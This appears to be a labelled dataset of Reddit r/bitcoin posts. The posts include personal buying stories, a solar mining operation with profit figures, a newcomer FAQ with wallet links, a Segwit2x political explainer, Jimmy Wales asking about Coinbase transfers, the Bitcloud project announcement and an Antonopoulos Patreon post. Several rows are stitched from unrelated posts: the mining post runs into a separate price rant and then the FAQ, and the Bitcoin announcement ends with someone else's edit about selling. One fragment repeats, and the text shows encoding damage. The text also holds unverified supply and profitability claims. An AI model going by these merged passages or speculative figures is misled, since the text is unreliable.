0,bitcoin,"In mid 2012 I bought 600 Bitcoin. In late 2012 I bought 600 BTC. I bought it because I thought in a sense I was donating to a cause, not for an investment. It went to $950. At one point my $4000 was worth half a million, which was almost 10√ó my portfolio. I sold 5 Bitcoin and spent a bit for some weed on the silk road (I was 20, please forgive me. Besides, back then, other than an eBay type website that you could buy gift cards from, you couldnt get much with bitcoin. Anybody remember the famous pizza?) Than bitcoin tumbled to $300. I invested in Doge with some of it, lost a lot there. I had over 5mil doge coin lost in a reddit tip wallet. I took my family on vacation through expedia after i had each of my kids, now 3. And once with my mom, so she could take the grand kids to disney world (she always wanted to take me and my sisters but single parent life sucks) After all the investments I should not have made, and the fun I do not regret having, I am a proud owner of 1.5 BTC.
The reason I made this post is so people can see the ups and downs of Bitcoin. Please understand, everything is about price now, but at one point it wasn't. It was the dread pirate Roberts sticking it to the man, it was people using bitcoin as a way to protest our government bailing out banks and letting us middle class and lower suffer. Trust me when I say a 50% change in bitcoin is not strange. I personally hope it shakes the greedy people off and liberates us like it was designed to do. A world wide currency, untouchable by our greedy governments. If I want to send money to a young man in Taiwan because I believe in his invention, I should be able to. Just as I once sent money to a magic card trading website in exchange for magic internet money because I believed in the cause.

However, not everyone is a developer and even if you are a developer, contributing to crypto is not easy. I was in the same position. 

But there are other ways! I installed Bitcoin Core on testnet and both Lnd and Eclair and tried opening channels, sending payments, closing channels etc. After a day or so, I discovered two bugs, filed them and cooperated with developers in tracking them and fixing them. If you are a bit tech savvy, you can do that too. In the process, you might also discover how lightning actually works and when it really comes, you'll be ready to take full advantage.

0,bitcoin,"I am mining in the desert using 100% solar and I am profitable I have 7 greenhouses in theSouthwest desert. I have twenty-five S9 miners inside these greenhouses. They are all running 100% off grid with solar and battery power.

I posted my numbers for this mining operation in the desert a few hours ago but it was downvoted into obscurity. Here is the link if anyone is interested:

https://www.reddit.com/r/Bitcoin/comments/6kiifr/another_update_on_my_solar_powered_farm_and/

Anyhow, I kinda think that this sub is controlled by miners. I want to test this out to see if it might be true. Cuz...maybe I am just being weird and got it wrong. For the record, I am often wrong.

So here it goes...I have documented my mining operation over the last year here on Reddit. I detailed my idea from when it was just an idea all the way to today, where I have a fully functional and profitable bitcoin mining operation in the middle of the desert....not connected to the grid at all. I am about to go all-in and buy 1,000 miners for the September shipment of new S9's.

Here are the numbers for mining, for those of you who are interested. You will need 6 kw of solar panels. And you will need 15 deep cycle lead-acid batteries (24V/200 amp hours each). And a power control system. I buy the batteries from China for $180 each. I pay $0.45 per watt for solar panels. Total cost for the off grid solution for ONE miner is $6800. It costs so little because I found the suppliers on AliBaba and negotiated my pricing. I am happy to share the suppliers with anyone who is interested (no one will be interested).

Cost for one S9 is $1225 landed on your door in the US. Total cost for the off grid mining solution is $8,000. I make .007 btc per day from each miner. This is about $18 per day at the current price. I make about $300 profit on each miner by reselling it (used). I can buy and sell these miners EVERY time there is a production run from Bitmain. I get in early and secure my order. Then I slowly sell them until the next batch is close to shipping.

I am pretty sure that there are LOTS of miners doing this and they don't want anyone else doing it. They are afraid of flooding the resell market. And they are afraid of increasing demand for miners. And I am pretty sure those people are now running this sub. But again, maybe I am wrong. We'll see...

Basically, I feel that there is a real effort to dissuade people from mining so that miners can continue to do this.

I purchase in advance from Bitmain and secure the lower pricing. I buy 100 miners and I run 25 of them.  I then begin to resell the remainder of my miners. There is such a long gap between shipments from Bitmain that the price just keeps going up and I profit on the resell of these machines. Meanwhile, I am using them to mine until they sell.

By reselling the miners I am making sure I am current with the fastest miners. I also profit from buying 100 miners early in the cycle to resell.

I have NO idea why this happens, but every time I post about mining and talk about how I have found what I believe to be an awesome idea for small to medium sized miners, I am down voted and called a liar and con man by a lot of people here.

So, I am testing my hypothesis. I think that one of three things will happen to this post: (1) it is down voted to obscurity  (2) I am relentlessly called out for being a liar and con man (3) no one cares.

For the record, this should be a post that is read by many people here. I am not trying to say that it is the most amazing thing that someone will read here. But, this is exactly the type of post that should have people discussing in a bitcoin forum.

Anyhow, for those who are interested, this info is not a FAKE POSTING. The numbers are real. I am highly profitable. I wish others would do the exact same thing. I want everyone to be mining."

It is so easy as you just have to see the FUD and how thick it gets. Same characters are always involved China, WSJ, CNBC and a army of new posters that spread some serious FUD on both reddit and bitcoin talk. Most posters are new and less than 1 month history on reddit, but they come in droves. 

Here it is for the newbies once again and you need to hammer this in your brain. THERE IS NOT ENOUGH BITCOIN SUPPLY. 16.5 million outstanding and 4-5 million lost through bad passwords and failed hard drives. 2.5-3 million held by the original people like Satoshi ( I am convinced it is the deceased Hal Finney), Craig Wright ect. 4-5 million coins held by Hodlers. It leaves only 5-6 million coins between 20+ major exchanges and the entire WORLD. I keep seeing all this TA, but this is not a stock. The people that sell are going to regret it again, and again. If you are in over your head and need it for bills you should have never bought this. This is when the weak hands get slaughtered. 

I just bought some more at 3915 and keeping another chunk for 3500-3600 range which not sure if it will hit. Take advantage of the FUD. 

Also I really hope China finally bans it outright. they will soon realize you can't ban a decentralized network. They should also ban mining while they are at it. This will be the best news in a long time. I really have a hard time believing China capital outflow theory. There is something else going on, and it could actually be a group of people in China are making major $$$ through the buy/ FOMO / sell / short /FUD / cover / buy. Why else would the second largest economy in the world go after something over and over for the last 4 years. Bitcoin will be so much stronger without these people just like when we split from the big blockers. 

In addition look at all the new tech headed are way. Lightning network, MAST, Schnorr Signatures, and on and on.

You've probably been hearing a lot about Bitcoin recently and are wondering what's the big deal?  Most of your questions should be answered by the resources below but if you have additional questions feel free to ask them in the comments.  

The following videos are a good starting point for understanding how bitcoin works and a little about its long term potential:

* [Video 1: What Is Bitcoin & Why Should You Care?](https://www.youtube.com/watch?v=NKSQdhxnvCc)
* [Video 2: The real value of bitcoin and crypto currency technology](https://www.youtube.com/watch?v=YIVAluSL9SU&index=1&list=FLqnDHJBl3xGTosMjyXc4-0A)

* [Video 4: Bitcoin 101 - Balaji Srinivasan](https://www.youtube.com/watch?v=JIxwTx7o_B4)

For some more great introductory videos check out [Andreas Antonopoulos's YouTube playlists](https://www.youtube.com/watch?v=qkxdys-Ek9U), he is probably the best bitcoin educator out there today.   Also have to give mention to James D'Angelo's [Bitcoin 101 Blackboard series](https://www.youtube.com/watch?v=Bhe61JaNFLU&index=6&list=PLzctEq7iZD-7-DgJM604zsndMapn9ff6q).  Lots of additional video resources can be found at the [videos wiki page](https://www.reddit.com/r/BitcoinWiki/wiki/videos) or /r/BitcoinTV.  

**Key properties of bitcoin**

* **Limited Supply** - There will only ever be 21,000,000 bitcoins created and they are issued in a predictable fashion, you can view the inflation schedule [here](https://bashco.github.io/Bitcoin_Monetary_Inflation/).  Once they are all issued Bitcoin will be truly deflationary.  The halving countdown can be found [here](http://bitcoinblockhalf.com/).
* **Open source** - Bitcoin code is fully auditable.  You can read the source code yourself [here](https://github.com/bitcoin/bitcoin).
* **Accountable** - The public ledger is transparent, all transactions are [seen by everyone](https://blockexplorer.com/).
* **Decentralized** - Bitcoin is globally distributed across thousands of nodes with no single point of failure and as such can't be shut down similar to how [Bittorrent](https://en.wikipedia.org/wiki/BitTorrent) works.
* **Censorship resistant** - No one can prevent you from interacting with the bitcoin network and no one can censor, alter or block transactions that they disagree with, see [Operation Chokepoint](https://en.wikipedia.org/wiki/Operation_Choke_Point).
* **Push system** - There are [no chargebacks](https://gendal.me/2013/10/21/lessons-from-bitcoin-push-versus-pull/) in bitcoin because only the person who owns the address where the bitcoins reside has the authority to move them.
* **Low fee** - Transactions fees can vary between a few cents and a few dollars depending on network demand and how much priority you wish to assign to the transaction. 
 Most wallets calculate the fee automatically but you can view current fees [here](https://bitcoinfees.21.co/).
* **Borderless** - No country can stop it from going in/out, even in areas currently unserved by traditional banking as the ledger is [globally distributed](http://bitcoinglobe.com/).
* **Trustless** - Bitcoin solved the [Byzantine's Generals Problem](https://en.wikipedia.org/wiki/Byzantine_fault_tolerance) which means nobody needs to trust anybody for it to work.
* **Pseudonymous** - No need to [expose personal information](http://bitcoinsimplified.org/learn-more/anonymity/) when purchasing with cash or transacting. 
* **Secure** - Encrypted cryptographically and can‚Äôt be [brute forced](https://miguelmoreno.net/wp-content/uploads/2013/05/fYFBsqp.jpg) or confiscated with proper key management such as hardware wallets.
* **Programmable** - Individual units of bitcoin can be [programmed to transfer](https://en.bitcoin.it/wiki/Script) based on certain criteria being met
* **Nearly instant** - From a few seconds to a [few minutes](https://blockchain.info/charts/avg-confirmation-time) depending on need for confirmations.  After a few confirmations transactions are irreversible.  
* **Peer-to-peer** - No intermediaries with a cut, no need for [trusted third parties](https://en.wikipedia.org/wiki/Peer-to-peer).
* **Portable** - Bitcoins are digital so they are easier to move than cash or gold.  They can even be transported by simply [remembering a string of words](https://en.bitcoin.it/wiki/Brainwallet) for wallet recovery.
* **Scalable** - Each bitcoin is [divisible down to 8 decimals](https://en.bitcoin.it/wiki/Scalability) allowing it to grow in value while still accommodating micro-transactions.
* **Designed Money** - Bitcoin was created to fit all the [fundamental properties of money](http://i.imgur.com/wkTyyaV.png) better than gold or fiat

**Note:** Bitcoins are valued at whatever [market price](https://cryptowat.ch/bitfinex/btcusd/1hr) people are willing to pay for them in balancing act of supply vs demand. Unlike traditional markets, bitcoin markets operate 24 hours per day, 365 days per year. [Preev](http://preev.com/btc/usd) is a useful site that  that shows how much various denominations of bitcoin are worth in different currencies. Alternatively you can just Google ""1 bitcoin in (your local currency)"".

## Securing your bitcoins

With bitcoin you can **""Be your own bank""** and personally secure your bitcoins **OR** you can use third party companies aka **""Bitcoin banks""** which will hold the bitcoins for you.


* If you prefer to **""Be your own bank""** and have direct control over your coins without having to use a trusted third party, there are many software wallet options [here](https://bitcoin.org/en/choose-your-wallet).  If you want easy and secure storage without having to learn computer security best practices, then a hardware wallet such as the [Trezor](https://www.bitcointrezor.com/) or [Ledger](https://www.ledgerwallet.com/) is recommended.  A more advanced option is to secure them yourself using [paper wallets](https://bitcoinpaperwallet.com/) generated offline.  Some popular mobile and desktop options are listed below and most are cross platform.  

Android | iOs | Desktop

[Mycelium](https://play.google.com/store/apps/details?id=com.mycelium.wallet)  | [BreadWallet](https://itunes.apple.com/app/breadwallet/id885251393) | [Electrum](https://electrum.org/#home)
[CoPay](https://play.google.com/store/apps/details?id=com.bitpay.copay&hl=en) | [AirBitz](https://itunes.apple.com/us/app/bitcoin-wallet-map-directory/id843536046?mt=8) | [Armory](https://btcarmory.com/)

* If you prefer to let third party **""Bitcoin banks""** manage your coins, try [Coinbase](https://www.coinbase.com/) or [Xapo](https://xapo.com/) but be aware you may not be in control of your private keys in which case you would have to ask permission to access your funds and be exposed to third party risk.  

Another interesting use case for physical storage/transfer is the [Opendime](https://opendime.com/).  Opendime is a small USB stick that allows you to spend Bitcoin by physically passing it along so it's anonymous and tangible like cash.  

**Note: For increased security, use Two Factor Authentication (2FA) everywhere it is offered, including email!** 

2FA requires a second confirmation code to access your account, usually from a text message or app, making it much harder for thieves to gain access.  Google Authenticator and Authy are the two most popular 2FA services, download links are below.  Make sure you create backups of your 2FA codes.

* 1-3% savings over credit cards or PayPal.
* No chargebacks (final settlement in 10 minutes as opposed to 3+ months).
* Accept business from a global customer base.
* Increased privacy.
* Convert 100% of the sale to the currency of your choice for deposit to your account, or choose to keep a percentage of the sale in bitcoin if you wish to begin accumulating it.

## Can I mine bitcoin?

Mining bitcoins can be a fun learning experience, but be aware that you will most likely operate at a loss.  Newcomers are often advised to stay away from mining unless they are only interested in it as a hobby similar to [folding at home](http://folding.stanford.edu/).  If you want to learn more about mining you can read more [here](https://en.bitcoin.it/wiki/Faq#Mining). Still have mining questions?  The crew at /r/BitcoinMining would be happy to help you out. 

If you want to contribute to the bitcoin network by hosting the blockchain and propagating transactions you can [run a full node](https://bitcoin.org/en/bitcoin-core/features/) using [this setup guide](https://medium.com/@lopp/how-to-set-up-a-bitcoin-full-node-2dd1c09763d3). [Bitseed](https://bitseed.org/) is an easy option for getting set up.  You can view the global node distribution [here](https://getaddr.bitnodes.io/).

## Earning bitcoins

Just like any other form of money, you can also earn bitcoins by being paid to do a job.

## Bitcoin Units

One Bitcoin is quite large (hundreds of ¬£/$/‚Ç¨) so people often deal in smaller units. The most common subunits are listed below:

Unit | Symbol | Value | Info
---|:---:|---|---
millibitcoin | mBTC | 1,000 per bitcoin | SI unit for milli i.e. millilitre (mL) or millimetre (mm)
microbitcoin | ŒºBTC | 1,000,000 per bitcoin | SI unit for micro i.e microlitre (ŒºL) or micrometre (Œºm)
bit |bit| 1,000,000 per bitcoin| Colloquial ""slang"" term for microbitcoin
satoshi |sat| 100,000,000 per bitcoin| Smallest unit in bitcoin, named after the inventor

For example, assuming an arbitrary exchange rate of $500 for one Bitcoin, a $10 meal would equal:

* 0.02 BTC
* 20 mBTC
* 20,000 bits

For more information check out the [Bitcoin units wiki](https://www.reddit.com/r/BitcoinWiki/wiki/bitcoin_units).

**Welcome to the Bitcoin community and the new decentralized economy!**"
0,bitcoin,"I don't get it.. I'm fully aware that the big boys will play big games, especially in an unregulated new-ish market such as crypto. I get why BTC and others are swinging like they are. I get the mechanics behind it. That's fine. 

What I don't understand is the empty talk...not just here, but everywhere. To the moon, FUD, the ""real"" bitcoin, attacks, scams, villains. Who gives a shit? If you think rich boys won't play rich boy games, you're naive. It happens in every industry and usually the best solution wins in the end...but the rich always get richer in the process.

In the end, what matters? The technology and its adoption/acceptance/utility. I have to dig 10x harder to find out what the technology roadmaps look like than I do to find out who big bad Roger is and details of his evil plans. Who gives a shit about that guy (or any of the other players)? Does b*cash have actual tangible plans to be successful? If so, I'd love a place to see those plans and make my own decisions. I've seen a lot of upcoming BTC developments (and the obligatory ""yea in 18 months"" replies), but that shows me there are plans and strategies for the next level of the technology. I understand that solid technology requires time to build and implementing a half-baked solution would equal failure. To be the biggest, you can't have those risks. Your big money investors won't tolerate it.

Oh, Chinese miners somewhat control and sway things and have a monopoly on the ASIC miners? Do we not have the ability to build these (likely in a better, faster, more efficient way)? Everybody is just pointing fingers and crying instead of providing guidance and insight.

Oh, transaction fees are too high and the ""market"" doesn't like it?  Well, from the way it seems, 90% of the newly invested money is here for the rollercoaster, unrelated to the technology. The ""older"" money here knows how useful this tech is. Not to mention - if the fees are that significant, can we not get this community involved in supporting education and development? Adoption of segwit addresses reduces fees, right? Are there things we can collectively do to help delivery of LN, Schnorr, other efforts? Let's be a solution to these problems instead of just regurgitating the problems all day. It's like watching CNN or Fox News while trying to actually get educated - won't happen. 

People are also caught up in the religion of Satoshi's ""vision"" which, like anything else, would naturally evolve as the product and technology evolves. Steve Jobs didn't plan on the iPhone on day 1 either, but if you said iPhone in his early days, you'd be against Steve's ""vision"". I don't know....just calm down.

TL,DR: Do you believe in your technology or not? If so, let the power players pay themselves with power moves. Chickens always come home to roost. Let's be educated and united in our belief of the technology. The price will be what we deserve in the end. 

Edit: just learned how to spell today"
0,bitcoin,"When asked if I have any Bitcoin I used say ""A little."" From now on it's going to be ""No, wish I did though."" Just my personal strategy going forward. It was fine when friends and family made fun of me, but now - at these gains - HODLers are going to become targets. Just a quick reminder to be careful out there."
0,bitcoin,"Hello from Jimmy Wales of Wikipedia So I set up a personal account at Coinbase to play around with bitcoin.  I thought I would buy and sell some, and try to spend on real world things, etc.  I've been watching bitcoin for a long time, of course, and I thought it past due to test it as a consumer - how hard is it, how confusing is it, etc.

Anyway, I mentioned this on twitter and a guy asked for my BTC address (which is: 1McNsCTN26zkBSHs9fsgUHHy8u5S1PY5q3 ) and last night a bunch of people got all excited and sent me BTC.  Obviously I'm going to cash all that out in a few days and send it onward to the Wikimedia Foundation so if you want to keep doing that, I'm ok with it.

In the meantime, I am still learning and I've seen some chatter about me moving the BTC from that address.  I think people are referring to this: https://blockchain.info/tx/29f8972043a293ad2168b62a85e8c9576d8ce6a02d624b9728e33143cae44d64

I didn't do that.  When I first saw it (I'm a newbie, remember!) I was slightly alarmed.  But someone else said that maybe it is coinbase moving it into cold storage.  And when I log into my coinbase account, I don't see anything missing, i.e. I see incoming transactions but no outgoing ones.

How can I best confirm?

I'm planning to re-open the conversation with the Wikimedia Foundation Board of Directors at our next meeting (and before, by email) about whether Wikimedia should accept bitcoin.  One reason (not the only reason) that we haven't is that setting it up as an option during the fundraiser has a lot of implications (we know, for example, and you will likely find this counterintuitive, that the more payment options we give people, the less they donate).  But it occurs to me that they could just set up an account on coinbase and announce it via social media, and not bother with integrating it into donation screens and all that.  The BTC community is pretty close-knit and generous, so that'd probably work pretty well.

tl;dr - I'm playing with bitcoin, thinking about it, and have some questions about how to look at blockchain.info.

You can confirm the address above by looking at my twitter: https://twitter.com/jimmy_wales/status/441634501265862657

And this reddit account is known to be associated with me, I think I confirmed it by posting on my wikipedia user page or something like that."

0,bitcoin,"We want to replace YouTube, Dropbox, Facebook, Spotify, ISPs, and more with decentralized apps based on proof of bandwidth. We need developers. Welcome to Bitcloud. Hello. We are at the very early stages of turning the proof of bandwidth idea into a reality. Please read the [nontechnical white paper](https://github.com/wetube/bitcloud/blob/master/Bitcloud%20Nontechnical%20White%20Paper.md) and the [Bitcloud protocol white paper](https://github.com/wetube/bitcloud/blob/master/bitcloud.org). We are going public with this idea because we want to be as open and transparent as possible. This project requires a massive amount of thought and development in many different parts of the protocol, so we need as many people helping as possible.  
  
With the proof of bandwidth concept, we can create decentralized applications for sharing bandwidth and routing network traffic. Bitcloud is a [distrubuted autonomous corporation](http://newswax.com/2014/01/implications-crypto-assets-part-3-distributed-autonomous-corporations/), which means nodes have an incentive to come onto the network. One of the many problems of certain free and open source projects in the past has been the lack of a profit incentive. With Bitcloud, nodes on a mesh network can be rewarded financially for routing traffic in a brand new mesh network. This removes the need for Internet Service Providers (Comcast, Verizon, AT&T, etc.). We can also replace many of the centralized applications on the current Internet, such as YouTube, Dropbox, Facebook, Spotify, and others with decentralized, open source alternatives. We will have to start by decentralizing the current Internet, and then we can create a new Internet to replace it. If you're interested in **privacy, security, ending Internet censorship, decentralizing the Internet, and creating a new mesh network to replace the Internet**, then you should join or support this project.  
  
If you're a developer who sees the potential implications of this project, send an email to developers@bitcloudproject.org.  
If you're someone who wants to help the project in any other way (web design, marketing, graphics design, etc.), send an email to support@bitcloudproject.org.   
We don't think it would be appropriate to take donations at this time, so please hold off on that for now.  
  
We can also be found on...

Feel free to x-post this to other subreddits if you think those individuals would be interested in helping out with this project. I'll also be glad to answer any questions that people have in this thread. I'm currently working on an FAQ, so your questions will be helpful to the project as a whole.

**UPDATE:** We are getting a lot of emails, so please be patient when it comes to responses. Just to give developers a heads up, there will be a section in the forums on the bitcloud website that divides up everything we need to do. We need need move the server over to the domain (right now it just redirects to the white paper). For now, head over to #bitcloud on freenode IRC and /r/bitcloud for discussions and development.  
  
**UPDATE #2:** The creator and lead developer is now also here to answer questions. He is /u/LiberateMen. Please upvote his posts because he is using a new Reddit account and he has a time delay between responses. Thanks!  
  
**UPDATE #3:** Thank you for the wonderful response! I've been answering questions this whole time, so I need to go eat something. Keep posting your questions, and I'll try to get to as many of them as possible. There is also some activity on freenode IRC at #bitcloud and on /r/bitcloud. Be back soon!  
  
**UPDATE #4:** Thanks again everyone. I need to finish setting up the website and forums, so I'll have to leave this thread for now. Anyone who is still interested in the project can head over to /r/bitcloud and follow us on twitter @bitcloudproject.

edit for those curious: basically i sold at that time cause i thought there was no way it could go higher. i thought after the big crash from the previous ATH that bitcoin would never go over a thousand again. Then it kept climbing. I watched from the sidelines while several people I knew made huge returns and it made me sick that i sold. Right before the all time high I couldnt stop thinking about this mistake I made and I FOMO'd. I convinced myself it was going to 100k. so I bought back in"
0,bitcoin,I am done with Coinbase/GDAX and you should be too. I have never seen a more obvious inside deal between Bcash and Coinbase. I am moving all of my trading to Gemini personally. As a bonus Gemini supports SegWit unlike Coinbase. I can't tolerate blatant disregard to integrity from Coinbase. 
0,bitcoin,"This community MUST DEMAND Blockchain evidence of the missing 800k Bitcoin. I, like many others find this whole Mt.Gox debacle very suspicious. Information surrounding Karpeles, 2bitidiot's leak, and US subpoenas is all quite vague and none of it seems to match up. We have been given ZERO conclusive information on how the bitcoins were stolen or even how long ago.

I implore everyone in this community to not just settle for this frog march of Karpeles. With bitcoin we have the ability to PROVE where these coins are.

The elephant in the room is that 800k bitcoin DO NOT just disappear without a trail on the blockchain. We have this ground breaking public ledger technology, lets not take it for granted.

Demand proof! If Gox has control of these coins or not, the BTC MUST be accounted for. Do not let this go by the wayside.  If Mt gox is not able to provide us with this proof not one person should believe the official story.


**EDIT: I did not lose bitcoin in MtGox. I am merely trying to spread awareness of the power blockchain has to prove or disprove claims people make about bitcoins being stolen. There are many class action lawsuits being brought against MtGox and this ability to trace the coins needs to be included in the trial.**

0,bitcoin,"*Must read for newcomers* My friend worked in the Bitcoin industry (broker) for a couple of years and has been involved in the crypto world since 2014. This is what he had to say about the recent politics of btc when someone asked him on our crypto trading channel (He first sent this article https://medium.com/@StopAndDecrypt/thats-not-bitcoin-this-is-bitcoin-95f05a6fd6c2, then followed up with this reply when someone told him he had no idea what he just read)

""There was a big scaling debate and in the end there were two sides. Those that wanted to scale using bigger blocksize (short term solution that doesn't work long term and also causes more centralization) vs those who wanted to scale using changes in the code to make the network more efficient aka SEGWIT+second layer scaling solutions (bitcoin becomes massive settlement layer, and second layer solutions can take care of verifying your $3.25 coffee payment). 

On the big block side you had (most) miners because they were only able to see the short term benefits of increased blocksize and they do not care about network centralization. Also, a chinese miner controlling a sizeable chunk of the network's hashrate had access to (and was in the process of patenting) this technology called ASICBOOST which is an exploit in bitcoin code that allows you to ""cheat"" and get extra hashing power out of your miners. Essentially they had an unfair advantage and the KEY is that the segwit upgrade fixes this exploit. Alongside these miners you had a couple of misguided (but incredibly wealthy because of early adoption) individuals who either have a reason to see bitcoin fail (like they are heavily invested in altcoins now) or they are too pigheaded to back down when wrong (or some of them I'm sure are not actually intelligent enough to understand they are wrong).

On the Segwit side you had all the core developers (the guys who worked side by side with satoshi to build all this and have been contributing to the code for years every day), the majority of the userbase, AND the vast majority of bitcoin companies. The two sides were basically arguing over who had control over bitcoin - was it the miners, or was it the users? Was it those who chose which software to run (users) or was it those who verified transactions for that software (miners)? (The answer as you will see shortly is Users). So basically these miners were stalling the upgrade because it would mean the end of their unfair (AND patented) advantage. This massive stalemate in the debate caused a community led uprising known as the User Activated Soft Fork movement (UASF). These guys basically said ""We're switching our nodes to Segwit software starting Aug 1 and we will be rejecting all mined blocks that do not comply with the new code"". This forced the miners' hand as they realized they would either be forked off the network or have to go along with the new upgrade to make sure everything continued to go smoothly (including their profits).

The movement gained enough support to freak out some big money bitcoin CEOs who got together in a room with the miners and made a deal behind closed doors known as the New York Agreement (NYA). This is where Segwit2x was born. The key to note here is that not a single core dev was invited to this meeting (in fact, not a single competent dev in general was invited). The terms of the deal were: You guys agree to implement Segwit now, and then we'll agree to an increase in block size later (November). Deal was made and obviously the majority of the user community was in an uproar because bitcoiners hate closed door deals (and they should for good reason). 

That being said, it got Segwit activated because it gave miners an easy way to safe face and go with segwit and the community instead of seeing their profits get wrecked by a messy chainsplit. However, do you remember that sneaky miner who had patented the ASICBOOST technology? Well he was part of the NYA and he decided to fork off anyway and create Bitcoin Cash. So stop right here and realize that the only reason we have bitcoin cash is so that some miner with a ton of hashing power could keep his unfair advantage over the network (he stills mainly mines bitcoin by the way because he would go out of business if he switched entirely to bitcoin cash). Also at this point, technically the NYA was broken because the whole point of it was to avoid a chainsplit and go with segwit followed by a block size increase whereas bitcoin cash was a clear chainsplit.

So for a few months everything was ok because we had Segwit, core devs were still with us, and (supposedly) anyone who wanted bigger blocks had forked off to bitcoin cash right? Wrong. See it turns out that those guys who made that backroom deal with the miners also had their own interests which involve removing the current core developers from their (imagined) seat of power. It is classic old school business politics - they don't care that core the devs are based around principles of meritocracy and peer review. They just want to have more of a say in the direction bitcoin takes. At this point, you might be thinking, ""Ok but its fair for companies who use a product to have a say in its development, right?"" NO. Not when the ""product"" at stake is meant to be an incredibly secure, incorruptible ledger that can hold trillions of dollars in wealth and still be hosted online accross the world. 

The fact is that no one understands the code better than the core developers and no one has more of an interest in seeing bitcoin stay decentralized and secure than these guys do. These guys literally cum buckets everyday to how much they love coding bitcoin. If Satoshi is Cypher Jesus then these guys are his Apostles. And on the other hand you have some severely misguided corporate buffoons who think they have the knowledge to negotiate a compromise with a group who has nothing but short term profit in their sights. And when the core developers are like ""wtf dude?"" and the community stands behind them, then these guys resort to essentially trying to kick core out of bitcoin by starting a new chain. A new chain which was based on a compromise that no one wants or needs anymore. And the excuse these CEO's are hiding behind is ""We don't want to go back on our word."" Classic business mindset vs coding mindset.

ur word."" Classic business mindset vs coding mindset. 

Now we come to the current situation where there are basically 4 sides

1. Core developers, and those supporting them
2. The (remaining) signers of the NYA and those supporting Segwit2x 
3. Malicious third parties who just want to see bitcoin fail (invested in altcoins/bitcoin cash or they are the Joker and just want to see shit burn)
4. Innocent bystanders


The core developers are continuing to code and improve bitcoin and they are working on second layer solutions. They haven't stopped development and have actually made a TON of beneficial changes to the code since the Segwit upgrade allowed them to. Being non-political or atleast being shit politicians, these guys do not know how to handle themselves with other people and either don't speak much or come off as pretentious d*bags (trust me I used to hate them before I smartened up). 

The remaining NYA signers. I say remaining because alot of companies left when they saw the massive backlash from the community. The only signers left are miners and then a group of around 30 companies which all have ties to Barry Silbert's holding company Digital Currency Group and suprise surprise who do you think got that NYA meeting together in the first place? Silly Silbert indeed. He's basically trying to do a sort of corporate take over of bitcoin where he decides who is writing the code and how they write it. Oh also I should note here that these guys have 1 developer working on the Segwit2x code. Yes 1, Jeff Garzik. Coding ability? Mediocre at best. All he did was copy and paste the entire bitcoin core code (because its open source) and changed the one little value that dictates block size. He changed a 1 to a 2 haha! And when he tried to make other changes he made critical mistakes that had to be fixed by CORE DEVELOPERS hahahaha! So how the f* does that even compare to an army of geeks who have been coding bitcoin for years and coding in general for decades who are all constantly trying to find mistakes in each others' work. SO people supporting Segwit2x are either severely misguided, hate core devs, or don't have all the information to make an informed decision.

Now the malicious actors. These are people who have a vested interest in seeing bitcoin crumble. I'm talking about big altcoin investors and bitcoin cash supporters (yes the guys who have ASICBOOST and want are the reason for this whole mess in the first place). And Segwit2x has presented them with a beautiful vector of attack. Divide and conquer. Right? And whereas with bitcoin cash there was replay protection (meaning the split was pretty clean and bitcoin was largely unaffected) this time they haven't got any planned - so should things go through as planned, things could get messy.

Then you have all those innocent bystanders who don't really know what to think anymore. Things have gotten so convoluted and complicated that it is hard to follow who wants what anymore. These are the people who will get the most fucked by something like Segwit2x because they won't understand the risks as it is happening and they won't have the knowledge to know which wallets to support. Imagine Segwit2x happens and one wallet sticks with the core version of bitcoin and the other wallet supports the segwit2x version but they both just say ""Bitcoin"".
 
That is why people are soooooooooooooo strongly opposed to Segwit2x more than anything. It is nothing more and nothing less than a hostile takeover attempt. And at this point that should be more than clear because why else would you still support the compromise made with miners who broke the compromise by creating bitcoin cash? No one wanted Segwit2x in the first place. People wanted bigger blocks, or segwit, not both. Segwit2x was never a faction in the debate. It was a faction that was spawned by those who created the NYA because they saw an opportunity take control of the software development from a group of developers who have been working on it for years and who strongly oppose corporate interests getting involved in bitcoin development.""

Bitcoin belongs to the community, always and forever"
0,bitcoin,"Andreas Antonopoulos posted this response to ""a prominent member of the bitcoin community"" on patreon. Andreas M. Antonopoulos posted
In defense of optimism
Yesterday, I woke to a flurry of activity on Twitter. A prominent member of the bitcoin community had decided to a message to me that many perceived as critical. The tweet pointed out that had I managed my money better I would be wealthy and wouldn't need the support of patrons.
It was in response to a message I posted on Twitter a week earlier, to once again dispel the impression that I am a bitcoin millionaire. It is hard for many to accept that someone who has been involved since 2012 has not amassed a great fortune in bitcoin. The truth, however, is that due to circumstances and some poor choices I made, I was not able to benefit as much from the rise of bitcoin as some others have.

At the end of 2012, when I heard about bitcoin, I had been working as a freelance consultant for about a year after burning out of my previous work as a partner in a research firm. I had a modest retirement fund, a small amount of credit card debt and enough income to make ends meet. I was really in limbo, looking for the next opportunity. Bitcoin arrived into my awareness and slapped me in the face. You've all heard my story of tumbling down the rabbit hall, absolutely consumed by awe.

What is not quite obvious is that my obsession also drove me to abandon my consulting work and put all my attention into bitcoin. I worked as hard as I have ever worked, focusing full time on this technology. During this time, I was unable to find any way of making a living through bitcoin. I traveled to speak at conferences (which didn't even cover expenses), I consulted with startups (which couldn't pay me), I wrote articles etc. To support my ""habit"", I dipped into my savings. I cut back on my expenses as much as I could and started ravaging my savings. By mid-2013 I was forced to start liquidating my retirement funds. In my early 40's, I was undoing a lifetime of savings, in a way most people would consider irresponsible. While doing so, I incurred penalty taxes for early withdrawal. Then, I went into credit card debt. By the end of 2013 I was ""worse than broke"": going into debt at an alarming rate.

Finally, in 2014 I started making a bit of income. I was so deep in debt that I continued to live paycheck to paycheck, struggling to chip away at my debt. It was going to be a long two years before I finally became debt free at the end of 2016.

I won't complain about the lost opportunity. I am extremely fortunate to be able to live debt free, doing my dream job in a field I absolutely love.

Yesterday, while reading the tweet that criticized me for my poor choices, I felt sick to my stomach. It forced me to confront and relive every choice I made and all the missed opportunities. You see, the critical tweet contained a big grain of truth. I could've become wealthy. If only I hadn't sold. If only I hadn't given away hundreds of bitcoin to complete strangers. If only I had reduced my expenses more. If only I had made smarter choices. If only...

Working in bitcoin is an endless struggle against cynicism, negativity, regret. Throughout the last 5 years I have always tried to maintain an optimistic and positive outlook, to focus on the long term, to think about the potential to lift billions out of poverty. But every now and then, I get dragged back into the negative. Yesterday was one of those days. I felt crushed.

And then, something amazing happened. Over the next several hours, tens, dozens, then hundreds of people responded. I sat reading the responses with tears in my eyes. An outpouring of positivity washed over me. People I have never met jumped to my defense, reminding me that they started their journey after watching my videos, or reading my books. Some people attacked the original criticism and its author (which I strongly discourage). But the vast majority focused on optimism.

